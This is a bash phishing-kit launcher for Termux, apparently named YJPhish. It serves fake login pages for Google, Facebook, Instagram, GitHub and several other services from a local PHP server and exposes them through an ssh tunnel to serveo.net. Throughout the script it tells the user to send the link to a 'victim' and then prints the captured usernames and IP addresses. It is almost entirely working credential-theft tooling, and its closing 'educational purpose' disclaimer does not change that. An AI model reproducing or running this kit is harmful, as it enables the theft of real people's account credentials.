echo ""
pkg install php -y
echo ""
pkg install dropbear -y
echo ""
pkg inatall openssh -y
clear
echo ""
sleep 5.0
red='\033[1;31m'
rset='\033[0m'
grn='\033[1;32m'
ylo='\033[1;33m'
blue='\033[1;34m'
cyan='\033[1;36m'
pink='\033[1;35m'
echo -e "$grn
      ██╗   ██╗   ██╗██████╗ ██╗  ██╗██╗███████╗██╗  ██╗
      ╚██╗ ██╔╝   ██║██╔══██╗██║  ██║██║██╔════╝██║  ██║
       ╚████╔╝    ██║██████╔╝███████║██║███████╗███████║
        ╚██╔╝██   ██║██╔═══╝ ██╔══██║██║╚════██║██╔══██║
         ██║ ╚█████╔╝██║     ██║  ██║██║███████║██║  ██║
         ╚═╝  ╚════╝ ╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═"$rset
echo -e "$red                                          v 1.0 (MADE BY YENOJ)"
echo -e "          $pink          press enter to continue "$rset
read pagal
echo -e "$red                             ➡$cyan [1️⃣] Google"
echo -e "$red                             ➡$cyan [2️⃣] Snapchat"
echo -e "$red                             ➡️$cyan [3️⃣] reddit"
echo -e "$red                             ➡$cyan [4️⃣] pinterest"
echo -e "$red                             ➡️$cyan [5️⃣] linkedin"
echo -e "$red                             ➡$cyan [6️⃣] Github"
echo -e "$red                             ➡️$cyan [7️⃣] Yahoo"
echo -e "$red                             ➡$cyan [8️⃣] Facebook" 
echo -e "$red                             ➡️$cyan [9️⃣] Instagram"
echo -e "$red                             ➡$cyan [🔟] Exit"
echo " "
echo -e "$blue [#]chose your phishing page(ex-1)"$rset

read yenoj
case "$yenoj" in
1)echo " "
if [ $yenoj='1' ] ; then
postion='google'
echo -e "$ylo [#]type port no.(5555)="$rset
read port
php -S localhost:$port > /dev/null 2>&1  &
 ssh -R $port:localhost:$port serveo.net  > /dev/null 2>&1 &
echo -e "$red [•]SEND THIS TO YOUR VICTIM=$rset http://serveo.net:$port/$postion/login.html"
echo -e "$blue [•]Wait for victim until he/she do login"$rset
sleep 60.0 
echo -e "" $cyan && cat /data/data/com.termux/files/home/YJPhish/sites/google/usernames.txt 
cat /data/data/com.termux/files/home/YJPhish/sites/google/ip.txt
fi
cd $HOME
cd YJPhish
bash YJP.sh ;;

2)echo " "
if [ $yenoj='2' ] ; then
postion='snapchat'
echo -e "$ylo [#]type port no.(5555)="$rset
read port
php -S localhost:$port > /dev/null 2>&1  &
 ssh -R $port:localhost:$port serveo.net  > /dev/null 2>&1 &
echo -e "$red [•]SEND THIS TO YOUR VICTIM=$rset http://serveo.net:$port/$postion/login.html"
echo -e "$blue [•]Wait for victim until he/she do login"$rset
sleep 60.0
echo -e "" $cyan && cat /data/data/com.termux/files/home/YJPhish/sites/snapchat/usernames.txt
cat /data/data/com.termux/files/home/YJPhish/sites/snapchat/ip.txt
fi
cd $HOME
cd YJPhish
bash YJP.sh ;;

3)echo " "
if [ $yenoj='3' ] ; then
postion='reddit'
echo -e "$ylo [#]type port no.(5555)="$rset
read port
php -S localhost:$port > /dev/null 2>&1  &
 ssh -R $port:localhost:$port serveo.net  > /dev/null 2>&1 &
echo -e "$red [•]SEND THIS TO YOUR VICTIM=$rset http://serveo.net:$port/$postion/login.html"
echo -e "$blue [•]Wait for victim until he/she do login"$rset
sleep 60.0
echo -e "" $cyan && cat /data/data/com.termux/files/home/YJPhish/sites/reddit/usernames.txt
cat /data/data/com.termux/files/home/YJPhish/sites/reddit/ip.txt
fi
cd $HOME
cd YJPhish
bash YJP.sh ;;

4)echo " "
if [ $yenoj='4' ] ; then
postion='pinterest'
echo -e "$ylo [#]type port no.(5555)="$rset
read port
php -S localhost:$port > /dev/null 2>&1  &
 ssh -R $port:localhost:$port serveo.net  > /dev/null 2>&1 &
echo -e "$red [•]SEND THIS TO YOUR VICTIM=$rset http://serveo.net:$port/$postion/login.html"
echo -e "$blue [•]Wait for victim until he/she do login"$rset
sleep 60.0
echo -e "" $cyan && cat /data/data/com.termux/files/home/YJPhish/sites/pinterest/usernames.txt
cat /data/data/com.termux/files/home/YJPhish/sites/pinterest/ip.txt
fi
cd $HOME
cd YJPhish
bash YJP.sh ;;

5)echo " "
if [ $yenoj='5' ] ; then
postion='linkedin'
echo -e "$ylo [#]type port no.(5555)="$rset
read port
php -S localhost:$port > /dev/null 2>&1  &
 ssh -R $port:localhost:$port serveo.net  > /dev/null 2>&1 &
echo -e "$red [•]SEND THIS TO YOUR VICTIM=$rset http://serveo.net:$port/$postion/login.html"
echo -e "$blue [•]Wait for victim until he/she do login"$rset
sleep 60.0
echo -e "" $cyan && cat /data/data/com.termux/files/home/YJPhish/sites/linkedin/usernames.txt
cat /data/data/com.termux/files/home/YJPhish/sites/linkedin/ip.txt
fi
cd $HOME
cd YJPhish
bash YJP.sh ;;

6)echo " "
if [ $yenoj='6' ] ; then
postion='github'
echo -e "$ylo [#]type port no.(5555)="$rset
read port
php -S localhost:$port > /dev/null 2>&1  &
 ssh -R $port:localhost:$port serveo.net  > /dev/null 2>&1 &
echo -e "$red [•]SEND THIS TO YOUR VICTIM=$rset http://serveo.net:$port/$postion/login.html"
echo -e "$blue [•]Wait for victim until he/she do login"$rset
sleep 60.0
echo -e "" $cyan && cat /data/data/com.termux/files/home/YJPhish/sites/github/usernames.txt
cat /data/data/com.termux/files/home/YJPhish/sites/github/ip.txt
fi
cd $HOME
cd YJPhish
bash YJP.sh ;;

7)echo " "
if [ $yenoj='7' ] ; then
postion='yahoo'
echo -e "$ylo [#]type port no.(5555)="$rset
read port
php -S localhost:$port > /dev/null 2>&1  &
 ssh -R $port:localhost:$port serveo.net  > /dev/null 2>&1 &
echo -e "$red [•]SEND THIS TO YOUR VICTIM=$rset http://serveo.net:$port/$postion/login.html"
echo -e "$blue [•]Wait for victim until he/she do login"$rset
sleep 60.0
echo -e "" $cyan && cat /data/data/com.termux/files/home/YJPhish/sites/yahoo/usernames.txt
cat /data/data/com.termux/files/home/YJPhish/sites/yahoo/ip.txt
fi
cd $HOME
cd YJPhish
bash YJP.sh ;;

8)echo " "
if [ $yenoj='8' ] ; then
postion='facebook'
echo -e "$ylo [#]type port no.(5555)="$rset
read port
php -S localhost:$port > /dev/null 2>&1  &
 ssh -R $port:localhost:$port serveo.net  > /dev/null 2>&1 &
echo -e "$red [•]SEND THIS TO YOUR VICTIM=$rset http://serveo.net:$port/$postion/login.html"
echo -e "$blue [•]Wait for victim until he/she do login"$rset
sleep 60.0
echo -e "" $cyan && cat /data/data/com.termux/files/home/YJPhish/sites/facebook/usernames.txt
cat /data/data/com.termux/files/home/YJPhish/sites/facebook/ip.txt
fi
cd $HOME
cd YJPhish
bash YJP.sh ;;

9)echo " "
if [ $yenoj='9' ] ; then
postion='instagram'
echo -e "$ylo [#]type port no.(5555)="$rset
read port
php -S localhost:$port > /dev/null 2>&1  &
 ssh -R $port:localhost:$port serveo.net  > /dev/null 2>&1 &
echo -e "$red [•]SEND THIS TO YOUR VICTIM=$rset http://serveo.net:$port/$postion/login.html"
echo -e "$blue [•]Wait for victim until he/she do login"$rset
sleep 60.0
echo -e "" $cyan && cat /data/data/com.termux/files/home/YJPhish/sites/instagram/usernames.txt
cat /data/data/com.termux/files/home/YJPhish/sites/instagram/ip.txt
fi
cd $HOME
cd YJPhish
bash YJP.sh ;;

10)
sleep 2.0
clear
echo " "
echo -e "$blue
                       ____  _  _  ____    ____  _  _  ____ 
                      (  _ \( \/ )( ___)  (  _ \( \/ )( ___)
                      ) _ < \  /  )__)    ) _ < \  /  )__) 
                      (____/ (__) (____)  (____/ (__) (____)...$cyan have a awesome day$rset"
echo -e "$red  NOTE:- Make sure that this tool is only for educational purpose and nothing else if you are doing any illegal activity then we are not responsible for that. " $rset
echo " "
exit
esac

